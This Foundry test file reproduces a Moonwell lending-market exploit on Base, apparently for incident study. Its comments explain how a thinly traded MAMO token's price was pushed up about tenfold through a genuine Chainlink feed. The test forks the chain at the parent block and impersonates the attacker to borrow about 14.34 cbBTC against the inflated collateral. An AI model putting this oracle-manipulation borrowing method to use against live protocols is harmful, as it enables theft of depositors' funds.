// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Moonwell (Compound-v2 fork) — Base — borrow against oracle-source-manipulated MAMO collateral.
//
// ~71.36 cbBTC (~$5.7M) drained from the mcbBTC market across 12 borrow txs by one EIP-7702 EOA,
// all the same selector against the same standing inflated collateral. This PoC reproduces the
// largest single borrow (~14.34 cbBTC, ~$1.15M).
//
// Primary tx  : 0xafb6f0fa257b115a5c813bf787b4c1535e63888b1d0dbeb1f3788f557f51798f (block 50516532)
// Attacker EOA: 0x719eae70d4A83f35bF82A2740699F5db84BE919D (an EIP-7702-delegated EOA; its delegate
//               impl 0xabda3cfe… is NOT used here — the borrow is issued directly as the EOA)
//
// Victim market   : mcbBTC 0xF877ACaFA28c19b96727966690b2f44d35aD5976 (underlying cbBTC 0xcbB7C000…)
// Comptroller     : 0xfBb21d0380beE3312B33c4353c8936a0F13EF26C
// Price oracle    : 0xEC942bE8A8114bFD0396A5052c36027f2cA6a9d0
// MAMO collateral : mMAMO 0x2F90Bb22eB3979f5FfAd31EA6C3F0792ca66dA32 (underlying MAMO 0x7300B37D…)
// MAMO/USD feed   : ChainlinkOEVWrapper 0xDBD37C274A70A8A3f92A227c843a6a8d3203afe6, forwarding the
//                   OCR2 aggregator 0x6F49F44436A220C8aebd5776AB58b80Ecb41622E (AccessControlledOCR2).
//
// Root cause (verified against on-chain state and Moonwell's verified Compound-v2-fork source, NOT
// a key/signer/admin path): Moonwell prices MAMO through a genuine Chainlink OCR2 feed — the oracle
// mechanism is NOT a manipulable on-chain spot read, it works exactly as designed. MAMO's real
// market is thin; the attacker moved MAMO's actual traded price ~10x, and the OCR2 nodes faithfully
// reported that genuinely-elevated price, which the wrapper forwarded unchanged. Measured on-chain:
//     MAMO/USD at a clean block (50000000) : 881_200   (8 dec) = $0.008812  (baseline)
//     MAMO/USD at the fork block           : 8_807_216 (8 dec) = $0.088072  (~10x)
// The attacker held ~41.5M MAMO supplied as mMAMO. At the inflated price that collateral was valued
// ~10x its true worth, so getAccountLiquidity(attacker) at the fork = ~$1.2M of borrow capacity,
// shortfall 0. borrow() on mcbBTC is a plain permissionless Compound function — no admin/signer
// gate; the only "authorization" is the (genuine, OCR2-sourced, but manipulated-at-market) price.
//
// Because the OCR2 feed's answer is set off-chain by the node set, an in-fork DEX swap cannot
// recreate it, and Moonwell's mMAMO market has a supply cap that blocks posting fresh MAMO
// collateral. So — following the settled-state precedent in this repo (StrongBlock / PantherBase /
// BarnBridge) — this PoC forks at the parent of the primary tx, where the OCR2-reported inflated
// price and the attacker's mMAMO collateral are already in state, and issues the real permissionless
// borrow. It is NOT a calldata replay and does NOT touch the attacker's 7702 delegate: it pranks the
// attacker EOA and calls Moonwell's real mcbBTC.borrow() directly. The borrow amount is the exact
// on-chain primary-tx value.
//
// MAMO's token bytecode uses a Cancun opcode (Base is post-Cancun), so cancun is required:
//   forge test --contracts src/test/2026-08/MoonwellMAMO_exp.sol --evm-version cancun -vvv

interface IMToken {
    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IComptroller {
    function getAccountLiquidity(
        address account
    ) external view returns (uint256 err, uint256 liquidity, uint256 shortfall);
}

interface IOracle {
    function getUnderlyingPrice(
        address mToken
    ) external view returns (uint256);
}

interface IChainlinkFeed {
    function latestRoundData() external view returns (uint80, int256 answer, uint256, uint256, uint80);
}

contract MoonwellMAMO_exp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0x719eae70d4A83f35bF82A2740699F5db84BE919D;
    IERC20 internal constant cbBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IMToken internal constant mcbBTC = IMToken(0xF877ACaFA28c19b96727966690b2f44d35aD5976);
    IComptroller internal constant COMPTROLLER = IComptroller(0xfBb21d0380beE3312B33c4353c8936a0F13EF26C);
    IOracle internal constant ORACLE = IOracle(0xEC942bE8A8114bFD0396A5052c36027f2cA6a9d0);
    address internal constant mMAMO = 0x2F90Bb22eB3979f5FfAd31EA6C3F0792ca66dA32;
    IChainlinkFeed internal constant MAMO_USD_FEED = IChainlinkFeed(0xDBD37C274A70A8A3f92A227c843a6a8d3203afe6);

    uint256 internal constant FORK_BLOCK = 50_516_531; // parent of the primary borrow tx (50516532)
    int256 internal constant CLEAN_MAMO_USD = 881_200; // $0.008812, MAMO/USD at clean block 50000000
    uint256 internal constant BORROW_AMOUNT = 1_433_796_192; // exact on-chain primary-tx borrow (14.33796192 cbBTC)

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(address(mcbBTC), "mcbBTC");
        vm.label(mMAMO, "mMAMO");
    }

    function testExploit() public {
        // The manipulation is already settled in state: the OCR2-sourced MAMO/USD price is ~10x its
        // clean baseline, so the attacker's standing mMAMO collateral carries ~$1.2M borrow capacity.
        (, int256 mamoUsd,,,) = MAMO_USD_FEED.latestRoundData();
        emit log_named_decimal_int("MAMO/USD clean baseline (8dec)", CLEAN_MAMO_USD, 8);
        emit log_named_decimal_int("MAMO/USD at fork      (8dec)", mamoUsd, 8);
        emit log_named_uint("oracle getUnderlyingPrice(mMAMO)", ORACLE.getUnderlyingPrice(mMAMO));
        (, uint256 liquidity, uint256 shortfall) = COMPTROLLER.getAccountLiquidity(ATTACKER);
        emit log_named_decimal_uint("attacker borrow capacity (USD,1e18)", liquidity, 18);
        assertGt(mamoUsd, CLEAN_MAMO_USD * 5, "MAMO/USD not inflated at fork");
        assertEq(shortfall, 0, "attacker should have no shortfall");

        uint256 before = cbBTC.balanceOf(ATTACKER);

        // Permissionless Compound borrow, issued directly as the attacker EOA (not via its 7702
        // delegate, not a calldata replay). Draws real cbBTC against the inflated MAMO collateral.
        vm.prank(ATTACKER);
        uint256 err = mcbBTC.borrow(BORROW_AMOUNT);
        assertEq(err, 0, "borrow should succeed");

        uint256 gained = cbBTC.balanceOf(ATTACKER) - before;
        emit log_named_decimal_uint("cbBTC drained", gained, 8);

        // Reproduces the primary tx's ~14.34 cbBTC drain, to the satoshi.
        assertEq(gained, BORROW_AMOUNT, "drained cbBTC mismatch");
        assertApproxEqAbs(gained, 14.338e8, 0.01e8, "drain off expected ~14.34 cbBTC");
    }
}
